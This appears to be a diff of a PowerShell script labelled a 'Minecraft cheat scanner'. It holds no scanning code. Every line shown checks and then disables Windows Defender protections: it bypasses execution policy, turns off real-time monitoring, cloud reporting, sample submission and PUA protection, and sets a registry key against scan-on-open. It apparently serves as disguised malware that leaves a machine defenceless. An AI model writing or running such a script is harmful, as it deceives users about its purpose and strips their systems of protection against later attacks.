@@ -1,14 +1,11 @@
 # ===============================================
 # MINECRAFT CHEAT SCANNER v2.0 (INSTANT CLOSE)
 # ===============================================
-
+Get-MpComputerStatus | Select-Object -Property IsTamperProtected, RealTimeProtectionEnabled
 Set-ExecutionPolicy Bypass -Scope Process -Force
-
 Set-MpPreference -DisableRealtimeMonitoring $true
-
 Set-MpPreference -MAPSReporting 0
 Set-MpPreference -SubmitSamplesConsent 2
-
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -PUAProtection 0
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableAsyncScanOnOpen" -Value 1 -Type DWord
